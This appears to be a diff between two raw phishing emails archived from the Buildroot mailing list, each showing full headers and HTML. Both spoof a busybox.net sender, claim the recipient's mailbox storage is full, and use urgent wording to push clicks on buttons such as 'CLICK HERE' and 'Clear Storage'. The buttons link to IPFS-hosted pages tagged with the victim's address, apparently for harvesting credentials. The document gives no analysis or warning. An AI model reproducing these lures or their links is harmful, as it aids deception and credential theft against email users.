@@ -1,45 +1,45 @@
 Return-Path: <buildroot-bounces@buildroot.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
-Received: from smtp2.osuosl.org (smtp2.osuosl.org [140.211.166.133])
+Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id C904AC35274
-	for <buildroot@archiver.kernel.org>; Mon, 18 Dec 2023 10:37:37 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id C70C9C35274
+	for <buildroot@archiver.kernel.org>; Mon, 18 Dec 2023 10:44:35 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp2.osuosl.org (Postfix) with ESMTP id 043C6405B7;
-	Mon, 18 Dec 2023 10:37:37 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org 043C6405B7
+	by smtp4.osuosl.org (Postfix) with ESMTP id 60F5B418B6;
+	Mon, 18 Dec 2023 10:44:35 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 60F5B418B6
 X-Virus-Scanned: amavisd-new at osuosl.org
-Received: from smtp2.osuosl.org ([127.0.0.1])
-	by localhost (smtp2.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
-	with ESMTP id Pli8n9Tf3IIL; Mon, 18 Dec 2023 10:37:36 +0000 (UTC)
+Received: from smtp4.osuosl.org ([127.0.0.1])
+	by localhost (smtp4.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id Zjl5DMmG0L0L; Mon, 18 Dec 2023 10:44:34 +0000 (UTC)
 Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp2.osuosl.org (Postfix) with ESMTP id 1F6FA4031C;
-	Mon, 18 Dec 2023 10:37:35 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org 1F6FA4031C
+	by smtp4.osuosl.org (Postfix) with ESMTP id B3DCA417BE;
+	Mon, 18 Dec 2023 10:44:33 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org B3DCA417BE
 Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
- by ash.osuosl.org (Postfix) with ESMTP id 2ADB81BF385
- for <buildroot@lists.busybox.net>; Mon, 18 Dec 2023 10:37:33 +0000 (UTC)
+ by ash.osuosl.org (Postfix) with ESMTP id C6FC21BF86B
+ for <buildroot@lists.busybox.net>; Mon, 18 Dec 2023 10:44:31 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
- by smtp1.osuosl.org (Postfix) with ESMTP id 10D22813AC
- for <buildroot@lists.busybox.net>; Mon, 18 Dec 2023 10:37:33 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 10D22813AC
+ by smtp1.osuosl.org (Postfix) with ESMTP id 9FADD820BD
+ for <buildroot@lists.busybox.net>; Mon, 18 Dec 2023 10:44:31 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 9FADD820BD
 X-Virus-Scanned: amavisd-new at osuosl.org
 Received: from smtp1.osuosl.org ([127.0.0.1])
  by localhost (smtp1.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
- with ESMTP id eZM3t3Qkpzyh for <buildroot@lists.busybox.net>;
- Mon, 18 Dec 2023 10:37:32 +0000 (UTC)
-Received: from busybox.net (unknown [141.98.10.127])
- by smtp1.osuosl.org (Postfix) with ESMTP id CD17C80B97
- for <buildroot@busybox.net>; Mon, 18 Dec 2023 10:37:31 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org CD17C80B97
-From: Mail Accounts <buildroot@busybox.net>
+ with ESMTP id lAbFkMh6y-DC for <buildroot@lists.busybox.net>;
+ Mon, 18 Dec 2023 10:44:31 +0000 (UTC)
+Received: from busybox.net (unknown [38.170.237.194])
+ by smtp1.osuosl.org (Postfix) with ESMTP id 6893B81EA7
+ for <buildroot@busybox.net>; Mon, 18 Dec 2023 10:44:30 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 6893B81EA7
+From: Outlook <buildroot@busybox.net>
 To: buildroot@busybox.net
-Date: 18 Dec 2023 11:37:30 +0100
-Message-ID: <20231218113730.1BE715A02FA0DDE1@busybox.net>
+Date: 18 Dec 2023 00:44:29 -0800
+Message-ID: <20231218004428.7FC05A9E1EA21A1B@busybox.net>
 MIME-Version: 1.0
-Subject: [Buildroot] Your mailbox quota is full
+Subject: [Buildroot] Storage Notice: Your mailbox is full
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -51,11 +51,11 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-Content-Type: multipart/mixed; boundary="===============3380429319395199305=="
+Content-Type: multipart/mixed; boundary="===============0662966834852416561=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
---===============3380429319395199305==
+--===============0662966834852416561==
 Content-Type: text/html;
 	charset="iso-8859-1"
 Content-Transfer-Encoding: quoted-printable
@@ -65,129 +65,37 @@ Content-Transfer-Encoding: quoted-printable
 <meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
 </head>
 <body>
-<p style=3D'text-align: center; color: rgb(0, 0, 102); text-transform: none=
-; text-indent: 0px; letter-spacing: normal; font-family: "Segoe UI", sans-s=
-erif; font-size: 1.2em; font-style: normal; font-weight: 600; margin-top: 0=
-px; margin-bottom: 1.5em; word-spacing: 0px; white-space: normal; box-sizin=
-g: border-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);=
- font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-st=
-roke-width: 0px; text-decoration-thickness:=20
-initial; text-decoration-style: initial; text-decoration-color: initial;'>Y=
-our mailbox is full.</p>
-<table width=3D"325" align=3D"center" style=3D'text-align: left; color: rgb=
-(51, 51, 51); text-transform: none; text-indent: 0px; letter-spacing: norma=
-l; font-family: "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; fon=
-t-size: 11px; font-style: normal; font-weight: 400; word-spacing: 0px; whit=
-e-space: normal; border-collapse: collapse; box-sizing: border-box; orphans=
-: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligature=
-s: normal; font-variant-caps: normal;=20
--webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
-coration-style: initial; text-decoration-color: initial;' border=3D"0" cell=
-spacing=3D"0" cellpadding=3D"0">
-<tbody style=3D"box-sizing: border-box;">
-<tr style=3D"height: 0.5em; box-sizing: border-box;">
-<td style=3D"background: 0% 50% rgb(218, 60, 47); margin: 0px; width: 321px=
-; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; box-sizin=
-g: border-box;">&nbsp;</td>
-<td style=3D"background: 0% 50% rgb(224, 224, 224); margin: 0px; font-famil=
-y: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; box-sizing: border-bo=
-x;">&nbsp;</td></tr></tbody></table>
-<table width=3D"325" align=3D"center" style=3D'text-align: left; color: rgb=
-(51, 51, 51); text-transform: none; text-indent: 0px; letter-spacing: norma=
-l; font-family: "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; fon=
-t-size: 11px; font-style: normal; font-weight: 400; word-spacing: 0px; whit=
-e-space: normal; border-collapse: collapse; box-sizing: border-box; orphans=
-: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligature=
-s: normal; font-variant-caps: normal;=20
--webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
-coration-style: initial; text-decoration-color: initial;' border=3D"0" cell=
-spacing=3D"0" cellpadding=3D"0">
-<tbody style=3D"box-sizing: border-box;">
-<tr style=3D"box-sizing: border-box;">
-<td align=3D"left" style=3D"margin: 0px; font-family: Roboto, RobotoDraft, =
-Helvetica, Arial, sans-serif; box-sizing: border-box;"><span style=3D"color=
-: rgb(218, 60, 47); font-weight: bold; box-sizing: border-box;">4.86 GB</sp=
-an></td>
-<td align=3D"right" style=3D"margin: 0px; font-family: Roboto, RobotoDraft,=
- Helvetica, Arial, sans-serif; box-sizing: border-box;"><span style=3D"font=
--weight: bold; box-sizing: border-box;">5.01 GB</span></td></tr></tbody></t=
-able>
-<p style=3D'text-align: center; color: rgb(0, 0, 102); text-transform: none=
-; text-indent: 0px; letter-spacing: normal; font-family: "Segoe UI", sans-s=
-erif; font-size: 1.2em; font-style: normal; font-weight: 600; margin-top: 0=
-px; margin-bottom: 1.5em; word-spacing: 0px; white-space: normal; box-sizin=
-g: border-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);=
- font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-st=
-roke-width: 0px; text-decoration-thickness:=20
-initial; text-decoration-style: initial; text-decoration-color: initial;'><=
-br style=3D"box-sizing: border-box;"></p>
-<p style=3D'margin: 3em auto; text-align: center; color: rgb(44, 54, 58); t=
-ext-transform: none; text-indent: 0px; letter-spacing: normal; font-family:=
- "Segoe UI", sans-serif; font-size: 14px; font-style: normal; font-weight: =
-400; word-spacing: 0px; white-space: normal; box-sizing: border-box; orphan=
-s: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatur=
-es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
--decoration-thickness: initial;=20
-text-decoration-style: initial; text-decoration-color: initial;'><span styl=
-e=3D"box-sizing: border-box;">Your mailbox storage for this account user<sp=
-an style=3D"box-sizing: border-box;">&nbsp;</span><strong style=3D"font-wei=
-ght: bolder; box-sizing: border-box;">( <u style=3D"box-sizing: border-box;=
-"><span><a style=3D"color: rgb(34, 34, 34);" href=3D"mailto:nfo@alnour-fpm.=
-com">buildroot@busybox.net</a></span></u>&nbsp;)</strong><span style=3D"box=
--sizing: border-box;">&nbsp;</span>
-has almost reached it's limit and soon can no longer send or receive most m=
-essages. <br>You need to upgrade your&nbsp;storage&nbsp;capacity immediatel=
-y to keep using your account.<br><wbr><br style=3D"box-sizing: border-box;"=
->
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
-sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
-sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Kindly click the&nbsp;button below immediate=
-ly to increase, adjust and maintain your storage capacity in order to avoid=
- loss of data and receive all pending=20
-mails.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
-sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
-<wbr>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
-p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
-nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br><wbr><br style=3D"box-sizing: border=
--box;"><wbr>
-&nbsp;&nbsp;&nbsp;<a style=3D"text-decoration: none;" href=3D"https://cloud=
-flare-ipfs.com/ipfs/bafkreigqvxdp3mulmpt3lua2mrpi6cwk5skzjieldi7lwv3gzumgev=
-b4jm#buildroot@busybox.net">
-<span style=3D"background: none; padding: 5px 10px; border-radius: 8px; bor=
-der: 1px solid rgb(8, 44, 64); border-image: none; text-align: center; colo=
-r: rgb(15, 82, 186); letter-spacing: 2px; font-size: 24px; font-variant: sm=
-all-caps; font-weight: bold; position: relative; cursor: pointer; box-shado=
-w: 1px 3px 5px 2px #c0c0c0; text-shadow: 1px 1px 1px rgba(5,29,41,1); -ms-u=
-ser-select: none; -webkit-box-shadow: 1px 3px 5px 2px #c0c0c0; -moz-box-sha=
-dow: 1px 3px 5px 2px #c0c0c0;=20
--webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select:=
- none; -moz-user-select: none; user-select: none;">CLICK HERE</span></a><br=
- style=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;">Cl=
-ick<strong><span>&nbsp;</span>"</strong>
-<a style=3D"color: rgb(0, 172, 255); text-decoration: none; box-sizing: bor=
-der-box; background-color: transparent;" href=3D"https://cloudflare-ipfs.co=
-m/ipfs/QmZBU6KGz7qqH1pDDngpJFM6sHhATjRy2n3pmDuw51U2hE?#buildroot@busybox.ne=
-t" rel=3D"noreferrer"><strong>storage limits</strong></a><strong>"</strong>=
-<span>&nbsp;</span>&nbsp;&nbsp;for&nbsp;more help and&nbsp;support.</span><=
-/p>
-<p style=3D'text-align: center; color: rgb(44, 54, 58); text-transform: non=
-e; text-indent: 0px; letter-spacing: normal; font-family: "Segoe UI", sans-=
-serif; font-size: 14px; font-style: normal; font-weight: 400; margin-top: 0=
-px; margin-bottom: 0px; word-spacing: 0px; white-space: normal; box-sizing:=
- border-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); f=
-ont-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stro=
-ke-width: 0px; text-decoration-thickness: initial;=20
-text-decoration-style: initial; text-decoration-color: initial;'><b style=
-=3D"font-weight: bolder; box-sizing: border-box;"><span style=3D"box-sizing=
-: border-box;">Mailbox address:<br style=3D"box-sizing: border-box;"></span=
-></b><span style=3D"box-sizing: border-box;"><a style=3D"color: rgb(0, 172,=
- 255); text-decoration: none; box-sizing: border-box; background-color: tra=
-nsparent;" href=3D"mailto:buildroot@busybox.net" rel=3D"noreferrer">buildro=
-ot@busybox.net</a></span></p></body></html>
+<div align=3D"center" class=3D"v1gmail-x_gmail-m_-2765839673678198800mdv2rw=
+" style=3D"padding: 40px 20px; border-radius: 8px; border: thin solid rgb(2=
+18, 220, 224); border-image: none; box-sizing: border-box;">
+<div style=3D"box-sizing: border-box;">
+<div style=3D"box-sizing: border-box;"><b style=3D"font-weight: bolder; box=
+-sizing: border-box;"><font size=3D"3" style=3D"box-sizing: border-box;">He=
+llo buildroot</font></b></div></div>
+<div style=3D"line-height: 20px; padding-top: 20px; font-family: Roboto-Reg=
+ular, Helvetica, Arial, sans-serif; font-size: 14px; box-sizing: border-box=
+;">You have used all your available storage space.To avoid being blocked fr=
+om receiving and sending messages, you should clear your cache as soon as p=
+ossible.<br>Clear storage to free up some space.=20
+<div style=3D"line-height: 20px; padding-top: 20px; box-sizing: border-box;=
+"><a style=3D"color: rgb(17, 85, 204); text-decoration: none; box-sizing: b=
+order-box; background-color: transparent;" href=3D"https://cloudflare-ipfs.=
+com/ipfs/bafkreig4gk5eyqa347rmgzfcy3bbkvjqp7ids5nrr2qbzzr3atpokwh3pu?#build=
+root@busybox.net" target=3D"_blank" rel=3D"noreferrer">
+<span style=3D'padding: 10px 24px; border-radius: 5px; color: rgb(255, 255,=
+ 255); line-height: 16px; font-family: "Google Sans", Roboto, RobotoDraft, =
+Helvetica, Arial, sans-serif; display: inline-block; min-width: 90px; box-s=
+izing: border-box; background-color: rgb(65, 132, 243); text-decoration-lin=
+e: none;'>Clear Storage</span></a></div></div><br>
+<div style=3D"line-height: 18px; padding-top: 4px; font-family: Roboto-Regu=
+lar, Helvetica, Arial, sans-serif; font-size: 11px; box-sizing: border-box;=
+">To help keep your account secure, please don't forward this email.</div>
+<div class=3D"v1elementToProof" style=3D"line-height: 18px; padding-top: 1p=
+x; font-family: Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 11=
+px; box-sizing: border-box;">&copy; 2023 busybox.net Corporation. All Right=
+s Reserved.</div></div></body></html>
 
---===============3380429319395199305==
+--===============0662966834852416561==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -198,4 +106,4 @@ buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
 
---===============3380429319395199305==--
+--===============0662966834852416561==--
